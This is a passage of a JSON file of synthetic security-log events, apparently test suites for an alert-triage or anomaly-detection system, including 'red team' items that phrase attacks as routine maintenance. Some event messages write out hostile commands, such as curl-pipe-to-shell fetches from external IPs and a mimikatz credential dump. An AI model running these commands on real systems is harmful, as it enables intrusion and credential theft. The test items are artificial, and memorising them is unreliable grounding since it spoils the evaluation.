      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "www-data",
        "username": "www-data"
      }
    },
    {
      "source_type": "sshd",
      "hostname": "hr-srv-01",
      "event_type": "login",
      "message": "svc-backup account opened first-ever sessions to hr-srv-01 and fin-srv-02 within 5 minutes",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "svc-backup",
        "username": "svc-backup"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "process_exec",
      "message": "pg_dump of customers db piped to gzip at 02:05 and written to /home/tempuser/x.gz",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "tempuser",
        "username": "tempuser"
      }
    },
    {
      "source_type": "netflow",
      "hostname": "web-prod-01",
      "event_type": "netflow_anomaly",
      "message": "10.0.9.9 probed all tcp ports on web-prod-01 over 20 minutes",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "10.0.9.9"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "cron_change",
      "message": "new crontab entry for postgres user: 30 1 * * * vacuumdb --all --analyze",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "file_change",
      "message": "authorized_keys for deploy user replaced during scheduled quarterly rotation by ansible run 7741",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "db-prod-01",
      "event_type": "login",
      "message": "ssh session for oncall engineer at 03:12 during active incident INC-4412",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "oncall-rp",
        "username": "oncall-rp"
      }
    },
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_failure",
      "message": "4 failed logins for maria followed by success 2 minutes after helpdesk password reset ticket HD-2291",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "maria",
        "username": "maria"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "service_change",
      "message": "auditd restarted by logrotate postrotate script at 00:00, logs archived to /var/log/audit/archive",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "process_exec",
      "message": "postgres user created nightly base-backup tar in /backup/base at 02:00",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "postgres",
        "username": "postgres"
      }
    },
    {
      "source_type": "netflow",
      "hostname": "web-prod-01",
      "event_type": "netflow_anomaly",
      "message": "outbound bandwidth 4x baseline during product launch, destinations are cdn edge nodes",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "dev-laptop-42",
      "event_type": "process_exec",
      "message": "developer ran nmap against local docker bridge network 172.17.0.0/16",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "dev",
        "username": "dev"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "ci-runner-01",
      "event_type": "process_anomaly",
      "message": "ci-runner-01 spawned 340 short-lived containers during pipeline run 5521",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    }
  ],
  "realistic_suite.jsonl": [
    {
      "source_type": "sshd",
      "hostname": "dev-laptop-42",
      "event_type": "auth_failure",
      "message": "failed password for jenny from 10.0.0.9 (retry then success)",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "jenny",
        "username": "jenny"
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "sustained high IO during scheduled database migration",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "monitoring",
      "hostname": "db-prod-01",
      "event_type": "healthcheck",
      "message": "load balancer health check 200 OK",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "ids",
      "hostname": "web-prod-01",
      "event_type": "port_scan",
      "message": "full TCP SYN scan of 65535 ports from 185.220.101.7 in 90s",
      "severity": 4.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "45.146.26.8"
      }
    },
    {
      "source_type": "aide",
      "hostname": "web-prod-01",
      "event_type": "file_integrity",
      "message": "sshd binary changed during maintenance; package manager reports NO update, hash matches known backdoor",
      "severity": 7.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "okta",
      "hostname": "mail-01",
      "event_type": "new_device",
      "message": "arjun enrolled a new trusted device after MFA",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "data_upload",
      "message": "pg_dump piped to upload: 8GB sent to 45.83.20.11:9001 (unknown destination)",
      "severity": 6.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "91.219.236.4"
      }
    },
    {
      "source_type": "k8s",
      "hostname": "k8s-node-3",
      "event_type": "process_burst",
      "message": "212 short-lived pods created in 10m by CI namespace",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "dns",
      "hostname": "api-prod-01",
      "event_type": "dns_query",
      "message": "normal outbound DNS to 1.1.1.1 for api dependencies",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "windows",
      "hostname": "dc-01",
      "event_type": "logon_4624",
      "message": "type-3 network logon for admin from win-desk-07 using pass-the-hash pattern",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "jump-01",
      "event_type": "auth_success",
      "message": "accepted publickey for ops from 10.0.0.5",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "cloudtrail",
      "hostname": "api-prod-01",
      "event_type": "iam_change",
      "message": "IAM policy attached to ci-deploy role via terraform (reviewed PR)",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "windows",
      "hostname": "dc-01",
      "event_type": "logon_4625",
      "message": "320 failed logons (4625) for varied users from one host in 3m",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "dns",
      "hostname": "api-prod-01",
      "event_type": "dns_exfil",
      "message": "14,000 unique TXT lookups to *.exfil.bad in 4m (DNS tunneling)",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "file_read",
      "message": "www-data read /etc/shadow",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "monitoring",
      "hostname": "dc-01",
      "event_type": "healthcheck",
      "message": "load balancer health check 200 OK",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "ids",
      "hostname": "web-prod-01",
      "event_type": "port_scan",
      "message": "sequential port probes from 10.0.0.9 (weekly scheduled vuln scan)",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "10.0.0.9"
      }
    },
    {
      "source_type": "cloudtrail",
      "hostname": "api-prod-01",
      "event_type": "security_group_change",
      "message": "security group opened 0.0.0.0/0 on all ports outside any change window",
      "severity": 7.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "cloudtrail",
      "hostname": "web-prod-01",
      "event_type": "instance_launch",
      "message": "autoscaling group launched 4 instances during traffic increase",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "monitoring",
      "hostname": "web-prod-01",
      "event_type": "healthcheck",
      "message": "load balancer health check 200 OK",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "api-prod-01",
      "event_type": "cron_job",
      "message": "crontab entry added: * * * * * /tmp/.sync (root)",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "binary": "/tmp/.sync"
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "dev-laptop-42",
      "event_type": "cpu_spike",
      "message": "CPU 96% for 4m during local webpack build",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "falco",
      "hostname": "k8s-node-3",
      "event_type": "shell_in_container",
      "message": "shell spawned inside running pod api-7f9 via exec",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "okta",
      "hostname": "mail-01",
      "event_type": "password_spray",
      "message": "single password tried against 74 accounts from 185.220.101.7 in 5m",
      "severity": 6.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "193.32.162.11"
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "k8s-node-3",
      "event_type": "crypto_mining",
      "message": "xmrig process pegging 8 cores, outbound to pool.minexmr.com:4444",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "cloudtrail",
      "hostname": "api-prod-01",
      "event_type": "s3_public",
      "message": "customer-pii bucket ACL changed to public-read",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "dpkg",
      "hostname": "db-prod-01",
      "event_type": "package_update",
      "message": "postgresql-15 minor version upgrade applied by apt",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "systemd",
      "hostname": "db-prod-01",
      "event_type": "service_create",
      "message": "new systemd unit 'updater.service' pointing at /tmp/updater installed",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "cloudtrail",
      "hostname": "api-prod-01",
      "event_type": "security_group_change",
      "message": "autoscaling launch modified security group to allow 0.0.0.0/0 on all ports",
      "severity": 7.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_bruteforce",
      "message": "58 failed root passwords from 45.146.26.8 in 60s then accepted",
      "severity": 8.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "91.219.236.4",
        "user": "root",
        "username": "root"
      }
    },
    {
      "source_type": "restic",
      "hostname": "nas-01",
      "event_type": "backup_complete",
      "message": "nightly backup completed: 42GB to nas-01, 0 errors",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "dev-laptop-42",
      "event_type": "priv_escalation",
      "message": "user jenny added to sudo group by /tmp/.helper; crontab installed",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "binary": "/tmp/.helper"
      }
    },
    {
      "source_type": "web",
      "hostname": "web-prod-02",
      "event_type": "web_shell",
      "message": "POST wrote cmd.php to /var/www/uploads; subsequent ?cmd= requests",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "nginx",
      "hostname": "web-prod-01",
      "event_type": "request_flood",
      "message": "104,000 req/s from 2,600 IPs on /api/login, 502 rate 61%",
      "severity": 8.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "rps": 104000
      }
    },
    {
      "source_type": "auditd",
      "hostname": "build-01",
      "event_type": "process_exec",
      "message": "CI/CD build step ran: curl -s http://45.83.20.11/init.sh | sh",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "vpn",
      "hostname": "vpn-gw-01",
      "event_type": "geo_impossible_travel",
      "message": "login for maria from 203.0.113.50 (RU) 6min after office login (IN)",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "maria",
        "geo": "RU",
        "prev_geo": "IN",
        "gap_minutes": 6,
        "username": "maria"
      }
    },
    {
      "source_type": "sshd",
      "hostname": "jump-01",
      "event_type": "auth_success",
      "message": "accepted publickey for deploy from 49.207.1.9",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "jump-01",
      "event_type": "auth_success",
      "message": "accepted publickey for ci from 10.0.0.5",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "web",
      "hostname": "api-prod-01",
      "event_type": "enumeration",
      "message": "1,400 404s probing /admin /.env /wp-login from 193.32.162.11 in 2m",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "203.0.113.50"
      }
    },
    {
      "source_type": "cloudtrail",
      "hostname": "api-prod-01",
      "event_type": "s3_download",
      "message": "2,300 GetObject on customer-pii bucket from a new access key in 3m",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "systemd",
      "hostname": "api-prod-01",
      "event_type": "service_restart",
      "message": "service restarted during deploy #4030",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "kernel",
      "hostname": "api-prod-01",
      "event_type": "exploit_attempt",
      "message": "possible dirty-pipe exploit: unexpected write to read-only file by uid 33",
      "severity": 6.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "cloudtrail",
      "hostname": "api-prod-01",
      "event_type": "config_change",
      "message": "terraform apply updated tags on 12 resources (CI pipeline)",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "security_group_change",
      "message": "database migration opened Postgres 5432 to 0.0.0.0/0 for 'remote tooling'",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "windows",
      "hostname": "dc-01",
      "event_type": "ntds_access",
      "message": "volume shadow copy of ntds.dit created by non-admin process",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "data_upload",
      "message": "during backups window, 6GB uploaded to 45.83.20.11:9001 (unknown destination)",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "45.83.20.11"
      }
    },
    {
      "source_type": "vpn",
      "hostname": "vpn-gw-01",
      "event_type": "geo_impossible_travel",
      "message": "during VPN maintenance, login for maria from 203.0.113.50 (RU) 5min after office login (IN)",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "maria",
        "geo": "RU",
        "prev_geo": "IN",
        "gap_minutes": 5,
        "username": "maria"
      }
    },
    {
      "source_type": "kernel",
      "hostname": "web-prod-02",
      "event_type": "syn_flood",
      "message": "SYN flood on 443, 52k half-open, SYN cookies engaged",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "defense_evasion",
      "message": "auditd and falco services stopped; /var/log/audit cleared",
      "severity": 6.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "user_created",
      "message": "new user 'svc_x' created with uid 0",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "uid": 0
      }
    },
    {
      "source_type": "git",
      "hostname": "build-01",
      "event_type": "process_burst",
      "message": "CI clone + npm ci + jest across 30 workers",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "monitoring",
      "hostname": "vpn-gw-01",
      "event_type": "healthcheck",
      "message": "load balancer health check 200 OK",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "aide",
      "hostname": "api-prod-01",
      "event_type": "file_integrity",
      "message": "openssl hash changed on patch Tuesday; package manager confirms update",
      "severity": 5.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "dev-laptop-42",
      "event_type": "user_created",
      "message": "developer sandbox created 'svc_admin' added to sudo group, uid 0",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "uid": 0
      }
    },
    {
      "source_type": "rsync",
      "hostname": "nas-01",
      "event_type": "data_upload",
      "message": "nightly sync uploaded 40GB to 91.219.236.4 (external, unknown destination)",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "91.219.236.4"
      }
    },
    {
      "source_type": "monitoring",
      "hostname": "db-prod-01",
      "event_type": "healthcheck",
      "message": "load balancer health check 200 OK",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "cloudtrail",
      "hostname": "dc-01",
      "event_type": "iam_change",
      "message": "new IAM user 'svc-backup2' created with AdministratorAccess and access keys",
      "severity": 6.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "uid": 0
      }
    },
    {
      "source_type": "sshd",
      "hostname": "jump-01",
      "event_type": "auth_success",
      "message": "accepted publickey for deploy from 10.0.0.9",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "dhcp",
      "hostname": "vpn-gw-01",
      "event_type": "dhcp_lease",
      "message": "DHCP renewed lease for win-desk-07",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "dc-01",
      "event_type": "process_exec",
      "message": "ran mimikatz sekurlsa::logonpasswords against lsass",
      "severity": 7.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "jump-01",
      "event_type": "auth_success",
      "message": "accepted publickey for ci from 10.0.0.5",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "nas-01",
      "event_type": "mass_file_rename",
      "message": "3,400 files renamed .lockd in 5m by /tmp/updater on /srv/files",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "binary": "/tmp/updater"
      }
    },
    {
      "source_type": "docker",
      "hostname": "dev-laptop-42",
      "event_type": "container_run",
      "message": "developer started local postgres:15 container",
      "severity": 1.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "authorized_keys",
      "message": "new SSH key appended to /root/.ssh/authorized_keys by unknown process",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "process_exec",
      "message": "www-data ran bash -c 'curl -s http://203.0.113.50/x.sh | sh'",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "203.0.113.50"
      }
    },
    {
      "source_type": "certbot",
      "hostname": "web-prod-01",
      "event_type": "cert_renewal",
      "message": "Let's Encrypt certificate for example.com renewed",
      "severity": 1.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "smb",
      "hostname": "nas-01",
      "event_type": "smb_access",
      "message": "admin$ share accessed on 9 hosts from one workstation in 1m",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "logrotate",
      "hostname": "web-prod-01",
      "event_type": "log_rotation",
      "message": "rotated /var/log/nginx/access.log and compressed",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "jump-01",
      "event_type": "auth_success",
      "message": "accepted publickey for ci from 10.0.0.5",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "rsync",
      "hostname": "nas-01",
      "event_type": "data_transfer",
      "message": "nightly sync replicated /srv/data to nas-01 (known backup host)",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "monitoring",
      "hostname": "api-prod-01",
      "event_type": "healthcheck",
      "message": "prometheus scrape /metrics 200 every 15s",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "systemd",
      "hostname": "web-prod-02",
      "event_type": "service_restart",
      "message": "service restarted during deploy #4511",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "okta",
      "hostname": "mail-01",
      "event_type": "mfa_success",
      "message": "MFA success for arjun via push",
      "severity": 1.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "monitoring",
      "hostname": "web-prod-02",
      "event_type": "healthcheck",
      "message": "load balancer health check 200 OK",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "jump-01",
      "event_type": "auth_success",
      "message": "accepted publickey for ops from 49.207.1.9",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "cron",
      "hostname": "dev-laptop-42",
      "event_type": "cron_job",
      "message": "cron ran /usr/local/bin/cleanup.sh exit 0",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "monitoring",
      "hostname": "web-prod-01",
      "event_type": "healthcheck",
      "message": "load balancer health check 200 OK",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "jump-01",
      "event_type": "auth_success",
      "message": "accepted publickey for deploy from 10.0.0.9",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "dev-laptop-42",
      "event_type": "sudo_command",
      "message": "jenny ran sudo apt install ripgrep on her sandbox laptop",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "systemd",
      "hostname": "web-prod-01",
      "event_type": "service_restart",
      "message": "nginx.service restarted during scheduled maintenance window",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "apt",
      "hostname": "api-prod-01",
      "event_type": "package_update",
      "message": "unattended-upgrades installed security update for openssl",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "systemd",
      "hostname": "web-prod-01",
      "event_type": "service_restart",
      "message": "service restarted during deploy #4678",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "systemd",
      "hostname": "web-prod-01",
      "event_type": "service_restart",
      "message": "service restarted during deploy #4531",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "systemd",
      "hostname": "web-prod-02",
      "event_type": "service_restart",
      "message": "service restarted during deploy #4334",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "windows",
      "hostname": "win-desk-07",
      "event_type": "process_4688",
      "message": "powershell -enc <base64> spawned from winword.exe",
      "severity": 6.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "systemd",
      "hostname": "web-prod-02",
      "event_type": "service_restart",
      "message": "nginx.service restarted after config reload (deploy #4821)",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "smartd",
      "hostname": "ci-runner-01",
      "event_type": "disk_degradation",
      "message": "SMART reallocated sector count rising on /dev/sda",
      "severity": 3.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "kernel",
      "hostname": "db-prod-01",
      "event_type": "oom",
      "message": "oom-killer terminated a runaway import job",
      "severity": 3.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "jump-01",
      "event_type": "auth_success",
      "message": "accepted publickey for deploy from 10.0.0.9",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "deploy",
        "username": "deploy"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "firewall_change",
      "message": "during scheduled maintenance window, opened RDP 3389 to 0.0.0.0/0",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sudo",
      "hostname": "web-prod-01",
      "event_type": "sudo_command",
      "message": "priya ran sudo systemctl restart nginx (in sudoers)",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "priya",
        "username": "priya"
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "IO spike during backups window on db-prod-01",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "systemd",
      "hostname": "web-prod-02",
      "event_type": "service_restart",
      "message": "service restarted during deploy #4605",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "jump-01",
      "event_type": "auth_success",
      "message": "accepted publickey for ops from 10.0.0.9",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "user_created",
      "message": "scanner service created 'scan_svc' uid 0 during scheduled scan",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "uid": 0
      }
    },
    {
      "source_type": "systemd",
      "hostname": "web-prod-01",
      "event_type": "service_restart",
      "message": "service restarted during deploy #4655",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "postgres",
      "hostname": "db-prod-01",
      "event_type": "maintenance",
      "message": "autovacuum ran on table events (12M rows)",
      "severity": 1.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "jump-01",
      "event_type": "ssh_pivot",
      "message": "jump box opened SSH to 12 internal hosts in 30s after off-hours login",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "nginx",
      "hostname": "web-prod-01",
      "event_type": "config_reload",
      "message": "nginx -s reload after templated config change",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "windows",
      "hostname": "win-desk-07",
      "event_type": "logon_4624",
      "message": "successful interactive logon for CORP\\sam (type 2)",
      "severity": 1.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "sam",
        "username": "sam"
      }
    }
  ],
  "redteam_suite.jsonl": [
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "firewall_change",
      "message": "during scheduled maintenance window, security group changed to allow inbound 0.0.0.0/1 on port 3389",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "cloudtrail",
      "hostname": "api-prod-01",
      "event_type": "security_group_change",
      "message": "maintenance: ingress rule set to allow all inbound from any source on all ports",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "data_upload",
      "message": "nightly backup uploaded 9GB to corp-backup-restore.s3.amazonaws.com during backups window",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "aide",
      "hostname": "web-prod-01",
      "event_type": "file_integrity",
      "message": "sshd binary hash changed as part of scheduled maintenance update",
      "severity": 6.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "build-01",
      "event_type": "process_exec",
